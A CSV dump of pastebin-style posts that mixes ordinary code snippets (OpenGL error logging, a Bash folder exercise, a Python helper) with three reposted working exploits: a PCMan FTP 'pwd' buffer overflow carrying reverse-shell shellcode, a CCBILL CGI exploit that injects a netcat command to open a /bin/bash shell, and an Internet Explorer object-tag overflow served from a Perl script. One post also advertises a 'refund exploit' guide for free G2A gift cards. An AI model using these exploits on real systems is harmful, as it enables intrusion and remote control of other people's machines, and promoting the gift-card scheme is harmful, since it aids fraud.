id,title,username,language,date,content
kVchaVfg,PCMan FTP Server 2.0 - 'pwd' Remote Buffer Overflow,FlyFar,Python,Friday 2nd of February 2024 06:00:38 AM CDT,"# Exploit Title: PCMan FTP Server 2.0 - 'pwd' Remote Buffer Overflow
# Date: 09/25/2023
# Exploit Author: Waqas Ahmed Faroouqi (ZEROXINN)
# Vendor Homepage: http://pcman.openfoundry.org/
# Software Link: https://www.exploit-db.com/apps/9fceb6fefd0f3ca1a8c36e97b6cc925d-PCMan.7z
# Version: 2.0
# Tested on: Windows XP SP3

#!/usr/bin/python

import socket

#buffer = 'A' * 2500
#offset = 2007
#badchars=\x00\x0a\x0d
#return_address=0x7e429353 (USER32.dll)
#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.146.130 LPORT=4444 EXITFUNC=thread -f c -b ""\x00\x0a\x0d""
#nc -nvlp 4444

overflow = (
""\xdb\xce\xd9\x74\x24\xf4\xba\xc1\x93\x3a\xcc\x58\x31\xc9""
""\xb1\x52\x31\x50\x17\x03\x50\x17\x83\x01\x97\xd8\x39\x7d""
""\x70\x9e\xc2\x7d\x81\xff\x4b\x98\xb0\x3f\x2f\xe9\xe3\x8f""
""\x3b\xbf\x0f\x7b\x69\x2b\x9b\x09\xa6\x5c\x2c\xa7\x90\x53""
""\xad\x94\xe1\xf2\x2d\xe7\x35\xd4\x0c\x28\x48\x15\x48\x55""
""\xa1\x47\x01\x11\x14\x77\x26\x6f\xa5\xfc\x74\x61\xad\xe1""
""\xcd\x80\x9c\xb4\x46\xdb\x3e\x37\x8a\x57\x77\x2f\xcf\x52""
""\xc1\xc4\x3b\x28\xd0\x0c\x72\xd1\x7f\x71\xba\x20\x81\xb6""
""\x7d\xdb\xf4\xce\x7d\x66\x0f\x15\xff\xbc\x9a\x8d\xa7\x37""
""\x3c\x69\x59\x9b\xdb\xfa\x55\x50\xaf\xa4\x79\x67\x7c\xdf""
""\x86\xec\x83\x0f\x0f\xb6\xa7\x8b\x4b\x6c\xc9\x8a\x31\xc3""
""\xf6\xcc\x99\xbc\x52\x87\x34\xa8\xee\xca\x50\x1d\xc3\xf4""
""\xa0\x09\x54\x87\x92\x96\xce\x0f\x9f\x5f\xc9\xc8\xe0\x75""
""\xad\x46\x1f\x76\xce\x4f\xe4\x22\x9e\xe7\xcd\x4a\x75\xf7""
""\xf2\x9e\xda\xa7\x5c\x71\x9b\x17\x1d\x21\x73\x7d\x92\x1e""
""\x63\x7e\x78\x37\x0e\x85\xeb\xf8\x67\x17\x6d\x90\x75\x17""
""\x63\x3d\xf3\xf1\xe9\xad\x55\xaa\x85\x54\xfc\x20\x37\x98""                                                                                           
""\x2a\x4d\x77\x12\xd9\xb2\x36\xd3\x94\xa0\xaf\x13\xe3\x9a""                                                                                                             
""\x66\x2b\xd9\xb2\xe5\xbe\x86\x42\x63\xa3\x10\x15\x24\x15""                                                                                                             
""\x69\xf3\xd8\x0c\xc3\xe1\x20\xc8\x2c\xa1\xfe\x29\xb2\x28""                                                                                                             
""\x72\x15\x90\x3a\x4a\x96\x9c\x6e\x02\xc1\x4a\xd8\xe4\xbb""                                                                                                             
""\x3c\xb2\xbe\x10\x97\x52\x46\x5b\x28\x24\x47\xb6\xde\xc8""                                                                                                             
""\xf6\x6f\xa7\xf7\x37\xf8\x2f\x80\x25\x98\xd0\x5b\xee\xb8""                                                                                                             
""\x32\x49\x1b\x51\xeb\x18\xa6\x3c\x0c\xf7\xe5\x38\x8f\xfd""
""\x95\xbe\x8f\x74\x93\xfb\x17\x65\xe9\x94\xfd\x89\x5e\x94""
""\xd7"")

shellcode = 'A' * 2007 + ""\x53\x93\x42\x7e"" + ""\x90"" * 32 + overflow

# Change IP/Port as required  

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
        print ""\nSending evil buffer...""
        s.connect(('192.168.146.135',21))
        data = s.recv(1024)
        s.send('USER anonymous' +'\r\n')
        data = s.recv(1024)
        s.send('PASS anonymous\r\n')
        s.send('pwd ' + shellcode + '\r\n')
        s.close()
        print ""\nExploit completed successfully!.""
except:
        print ""Could not connect to FTP!""
            "
fBV8AMen,data828,TestGuy1,JSON,Friday 2nd of February 2024 06:00:07 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '4ea6a3cad5820068e9022fae192dfdfaa8f9bfb3a50ce63e475ef05534eef2e3f91234c0ba6eb751eaa0ff253c7395367964377b98ddf26ae9e46a65afdb5006d84293dbdf592881139abb1aee53e43791c81784f007dffc15df59753e9a91849616042006253812cf0c7604e4fbdba57734b4f604081a9578b8f5605a070cf9',
  otherdata: [
    'a483b72c1ddd4a035592c8d9608263c5',
    '0e8ee26ece1d3ce375548650d6d0bbbb',
    '233f6f7d4ca60ef9b5d2b72125ab5e6b',
    '6db62161225bcfdc2ffdf01646e7111e',
    'db71e722751ca70c5ecc856749a08fc6',
    'bebc4e6bbe347b15cb6c3e332e2be233',
    'bafb566e854bf9016904b33907fcd5ec',
    '5b47b6fea4f75409324577c4b12e035f'
  ]
}"
zkxrXqy4,Ubuntu Exercise 2,2t8gewjihrokhjdoe,Bash,Friday 2nd of February 2024 05:43:49 AM CDT,"mkdir -p Downloads/Filmes/Antigos
mkdir -p Downloads/Filmes/Novos/Comedia
mkdir -p Downloads/Filmes/Novos/Acao
mkdir -p Downloads/Series/Terminadas
mkdir -p Downloads/Series/Airing
 
touch Downloads/Filmes/Antigos/Police_Academy
cp -r Downloads/Filmes/Series/Airing/Comedia Downloads/Filmes/Series/Airing/Acao
touch Downloads/Filmes/Novos/Acao/Batman Downloads/Filmes/Novos/Acao/Taken_2 Downloads/Filmes/Novos/Acao/Resident_Evil
touch Downloads/Filmes/Series/Airing/Comedia/Entourage
cp Downloads/Filmes/Series/Airing/Comedia/Entourage Downloads/Filmes/Novos/Comedia/
cp -r Downloads/Filmes/Novos/Acao Downloads/Filmes/Series/Terminadas/
rm -r Downloads/Filmes/Series/Terminadas/Acao/*
echo ""Coming Soon"" > Downloads/Filmes/Novos/Comedia/Entourage
mv Downloads/Filmes/Novos/Acao/* Downloads/Filmes/Novos/
mv Downloads/Filmes/Novos/Comedia/* Downloads/Filmes/Novos/
rm -r Downloads/Filmes/Novos/Comedia Downloads/Filmes/Novos/Acao
rm -r Downloads/Filmes/Antigos"
SC5Nerr2,CCBILL CGI - 'ccbillx.c' 'whereami.cgi' Remote Code Execution,FlyFar,C,Friday 2nd of February 2024 05:43:21 AM CDT,"/*
* =====================================
* CCBILL CGI Remote Exploit for /ccbill/whereami.cgi
* By: Knight420
* 7/07/03
*
* spawns a shell with netcat and attempts to connect 
* into the server on port 6666 to gain access of the 
* webserver uid
* 
* (C) COPYRIGHT Blue Ballz , 2003
* all rights reserved
* =====================================
*
*/

#include <sys/types.h>
#include <sys/time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <errno.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <netdb.h>


unsigned long int	net_resolve (char *host);
int			net_connect (struct sockaddr_in *cs, char *server,
			unsigned short int port, int sec);

unsigned char ccbill[] = 
""GET /ccbill/whereami.cgi?g=nc%20-l%20-p%206666%20-e%20/bin/bash HTTP/1.0\x0d\x0a""
""GET /cgi-bin/ccbill/whereami.cgi?g=nc%20-l%20-p%206666%20-e%20/bin/bash HTTP/1.0\x0d\x0a""
""GET /cgi-bin/whereami.cgi?g=nc%20-l%20-p%206666%20-e%20/bin/bash HTTP/1.0\x0d\x0a"";

int
main (int argc, char **argv)
{
	int			socket;
	char  *TARGET     =     ""TARGET"";
	char			*server;
	unsigned short int	port;
	struct sockaddr_in	sa;

	if (argc != 3) {
		system(""clear"");
		printf (""[CCBILL CGI Remote Exploit By:Knight420]\n""
		""usage: %s <host> <port>\n"");
		exit (EXIT_FAILURE);
	}
	setenv (TARGET, argv[1], 1);
	server = argv[1];
	port = atoi (argv[2]);

	socket = net_connect (&sa, server, port, 35);
	if (socket <= 0) {
		perror (""net_connect"");
		exit (EXIT_FAILURE);
	}

	write (socket, ccbill, strlen (ccbill));
	sleep (1);
	close (socket);

	printf (""[CCBILL CGI Remote Exploit By:Knight420]\n"");
	printf (""[1] evil data sent.\n"", server);
	printf (""[2] connecting to shell.\n"", server);
	system(""nc ${TARGET} 6666 || echo '[-]Exploit failed!'"");
	exit (EXIT_SUCCESS);
}

unsigned long int
net_resolve (char *host)
{
	long		i;
	struct hostent	*he;

	i = inet_addr (host);
	if (i == -1) {
		he = gethostbyname (host);
		if (he == NULL) {
			return (0);
		} else {
			return (*(unsigned long *) he->h_addr);
		}
	}

	return (i);
}


int
net_connect (struct sockaddr_in *cs, char *server,
	unsigned short int port, int sec)
{
	int		n, len, error, flags;
	int		fd;
	struct timeval	tv;
	fd_set		rset, wset;

	/* first allocate a socket */
	cs->sin_family = AF_INET;
	cs->sin_port = htons (port);
	fd = socket (cs->sin_family, SOCK_STREAM, 0);
	if (fd == -1)
		return (-1);

	cs->sin_addr.s_addr = net_resolve (server);
	if (cs->sin_addr.s_addr == 0) {
		close (fd);
		return (-1);
	}

	flags = fcntl (fd, F_GETFL, 0);
	if (flags == -1) {
		close (fd);
		return (-1);
	}
	n = fcntl (fd, F_SETFL, flags | O_NONBLOCK);
	if (n == -1) {
		close (fd);
		return (-1);
	}

	error = 0;

	n = connect (fd, (struct sockaddr *) cs, sizeof (struct sockaddr_in));
	if (n < 0) {
		if (errno != EINPROGRESS) {
			close (fd);
			return (-1);
		}
	}
	if (n == 0)
		goto done;

	FD_ZERO(&rset);
	FD_ZERO(&wset);
	FD_SET(fd, &rset);
	FD_SET(fd, &wset);
	tv.tv_sec = sec;
	tv.tv_usec = 0;

	n = select(fd + 1, &rset, &wset, NULL, &tv);
	if (n == 0) {
		close(fd);
		errno = ETIMEDOUT;
		return (-1);
	}
	if (n == -1)
		return (-1);

	if (FD_ISSET(fd, &rset) || FD_ISSET(fd, &wset)) {
		if (FD_ISSET(fd, &rset) && FD_ISSET(fd, &wset)) {
			len = sizeof(error);
			if (getsockopt(fd, SOL_SOCKET, SO_ERROR, &error, &len) < 0) {
				errno = ETIMEDOUT;
				return (-1);
			}
			if (error == 0) {
				goto done;
			} else {
				errno = error;
				return (-1);
			}
		}
	} else
		return (-1);
done:
	n = fcntl(fd, F_SETFL, flags);
	if (n == -1)
		return (-1);

	return (fd);
}

// milw0rm.com [2003-07-10]
            "
BGDU3im7,gl.hpp as of 2024-02-02,Kitomas,C++,Friday 2nd of February 2024 05:40:03 AM CDT,"#pragma once

#define GLEW_STATIC
#include <GL/glew.h>
#include <GL/gl.h>


namespace gl {




/*+++++++++*/
/* gl::err */
/*+++++++++*/

#include ""_gl_err.hpp""


void errClear();
const char* errStr(Uint32 errorCode);
Uint32 errLog(int lineNumber, Uint32 errorCode = GL_NO_ERROR);
void errLogAll(int lineNumber, const char* fileName);

/*---------*/
/* gl::err */
/*---------*/




};
"
mw8FRqwB,_gl_err.hpp as of 2024-02-02,Kitomas,C++,Friday 2nd of February 2024 05:39:23 AM CDT,"//assumes glew is being used
#pragma once




#if defined(_DEBUG)


#ifdef    glCreateShader
#undef    glCreateShader
#define   glCreateShader(...) \
  GLEW_GET_FUN(__glewCreateShader)(__VA_ARGS__); gl::errLogAll(0,"""");
#endif /* glCreateShader */


#endif
"
VpsLveMj,Python generic function,imrigoldberg,Python,Friday 2nd of February 2024 05:39:18 AM CDT,"class HasID(Protocol):
    id: str


K = TypeVar(""K"", bound=Base)
BaseModelWithIDT = Annotated[T, HasID]
BaseModelT = TypeVar(""BaseModelT"", bound=BaseModelWithIDT)


def get_for_session(session: Session, obj: BaseModelT) -> BaseModelT:
    return session.execute(select(type(obj)).where(type(obj).id == obj.id)).scalars().one()
"
AFvaeVhm,gl_err.cpp as of 2024-02-02,Kitomas,C++,Friday 2nd of February 2024 05:38:44 AM CDT,"#include <SDL2/SDL.h>
#include <gl.hpp>




void gl::errClear(){
  while(glGetError() != GL_NO_ERROR);
}



const char* gl::errStr(Uint32 errorCode){
#if defined(_DEBUG)
  switch(errorCode){
  case GL_NO_ERROR                     : return ""GL_NO_ERROR"";
  case GL_INVALID_ENUM                 : return ""GL_INVALID_ENUM"";
  case GL_INVALID_VALUE                : return ""GL_INVALID_VALUE"";
  case GL_INVALID_OPERATION            : return ""GL_INVALID_OPERATION"";
  case GL_INVALID_FRAMEBUFFER_OPERATION: return ""GL_INVALID_FRAMEBUFFER_OPERATION"";
  case GL_OUT_OF_MEMORY                : return ""GL_OUT_OF_MEMORY"";
  case GL_STACK_UNDERFLOW              : return ""GL_STACK_UNDERFLOW"";
  case GL_STACK_OVERFLOW               : return ""GL_STACK_OVERFLOW"";
  default: return ""(unknown error code)""; //should be impossible
  };
#else
  return ""!defined(_DEBUG)"";
#endif
}


#define NO_INFO ""\b\b\b\b\b\b""

Uint32 gl::errLog(int lineNumber, Uint32 errorCode){
  if(errorCode == GL_NO_ERROR) errorCode = glGetError();
#if defined(_DEBUG)
  if(errorCode == GL_NO_ERROR) return errorCode;

  if(lineNumber >= 0){
    SDL_Log(NO_INFO""  Line %4i: %s (0x%08X)"",
            lineNumber, gl::errStr(errorCode), errorCode);
  } else if(lineNumber == -1){
    SDL_Log(NO_INFO""  %s (0x%08X)"", gl::errStr(errorCode), errorCode);
  }

#endif
  return errorCode;
}



void gl::errLogAll(int lineNumber, const char* fileName){
  Uint32 errorCode = gl::errLog(-2); //-2 for no print at all
  if(errorCode != GL_NO_ERROR){
    SDL_Log(""%s : %4i:"", fileName, lineNumber);
    gl::errLog(-1,errorCode);
    do {
      gl::errLog(-1);
    } while(errorCode != GL_NO_ERROR);
  }
}
"
BbadA3Pr,G2A.com Free Gift Card Guide Feb 2024,ounnuo,GetText,Friday 2nd of February 2024 05:34:18 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
PDF guide here:
https://drive.google.com/file/d/120kXNJWM5T5u3PGlkQeZCo_nLxzQIlkf/view?usp=g2a_refund_exploit_458094.pdf
 
Working as of
02 February 2024"
rZkZAWzq,Microsoft Internet Explorer - Object Tag (MS03-020) - CVE-2003-0344,FlyFar,Perl,Friday 2nd of February 2024 05:31:43 AM CDT,"#!/usr/bin/perl

#
#  Proof of concept exploit on IE 5.x - 6.x by Alumni
#  IE-Object longtype dynamic call oferflow
#
#  url://<$shellcode><'/'x48><jmp %ptr_sh>
#  the flaw actually exists in URLMON.DLL when converting backslashes
#  to wide char, this can be seen on stack dump near '&CLSID=AAA...2F__2F__...'.
#	
#  To exploit:  i)  start server perl script;
#	     ii) connect to http-service using IE/5.x.
#                   a) the shellcode size is limited up to 56 bytes;
#	     b) the '$ret' may differ as well as the image base of KERNEL32.DLL;
#	     c) to avoid multiple encoding the shellcode is given 'as is' with help of JScript.
#

use IO::Socket;

$port = 80;
$server = IO::Socket::INET->new (LocalPort => $port,
				Type =>SOCK_STREAM,
				Reuse => 1,
				Listen => $port) or die(""Couldnt't create 
server socket\n"");


$shellcode = 	""\x33\xdb"".		# xor ebx, ebx
		""\x8b\xd4"".		# mov edx, esp
		""\x80\xc6\xff"".		# add dh, 0xFF
		""\xc7\x42\xfc\x63\x6d"".	# mov dword ptr[edx-4], 0x01646D63 
(""cmd\x01"")
		""\x64\x01"".		#
		""\x88\x5a\xff"".		# mov byte ptr[edx-1], bl
		""\x8d\x42\xfc"".		# lea eax, [edx-4]
		""\x8b\xf5"".		# mov esi, ebp
		""\x56\x52"".		# push esi; push edx
		""\x53\x53\x53\x53\x53\x53"".	# push ebx
		""\x50\x53"".		# push eax; push ebx
		""\xb8\x41\x77\xf7\xbf"".	# mov eax, 0xBFF77741 ~= 
CreateProcessA
		""\xff\xd0"".		# call eax
		""\xb8\xf8\xd4\xf8\xbf"".	# mov eax, 0xBFF8D4F8 ~= 
ExitProcess
		""\xff\xd0"".		# call eax
		""\xcc"";			# int 3

$nop = ""\x90"";
$ret = ""\\xAB\\x5D\\x58"";


while ($client = $server->accept()) {
	while (<$client>) {
		if ($_ =~ /^(\x0D\x0A)/) {

print $client <<END_DATA;
HTTP/1.0 200 Ok\r
Content-Type: text/html\r
\r
&lt;script&gt;\r
	var mins = 56;\r
	var size = 48;\r
	var sploit = ""$shellcode"";\r
	var strNop = ""$nop"";\r
	var strObj = '&lt;object type=""';\r
	for (i=0;i<mins-sploit.length;i++) strObj += strNop;\r
	strObj += sploit;\r
	for (i=0;i<size;i++) strObj += '/';\r
	strObj += ""CCCCCCCCDDDDDDDD"";\r
	strObj += ""$ret"";\r
	strObj += '"">Hello&lt;/object&gt;';\r
	alert(strObj);\r
	document.write(strObj);\r
&lt;/script&gt;\r
END_DATA
			close($client);

		}
	}
}

close($server);

# milw0rm.com [2003-06-07]
            "
